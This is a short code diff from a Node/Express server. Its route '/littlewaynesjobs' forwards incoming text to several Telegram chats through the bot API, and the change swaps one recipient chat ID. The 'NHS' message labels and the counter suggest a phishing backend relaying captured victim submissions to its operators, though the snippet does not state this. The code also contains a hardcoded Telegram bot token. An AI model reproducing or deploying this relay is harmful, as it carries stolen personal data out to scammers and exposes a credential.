@@ -743,7 +743,7 @@ app.post('/littlewaynesjobs',  apiLimiter, (req, res) => {
                 `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSWayne:\n${originalText}`
             );
             axios.post(
-                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1248378980&text=NHS:\n${originalText}`
+                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1532191460&text=NHS:\n${originalText}`
             );
             kelvCount += 1;
         }
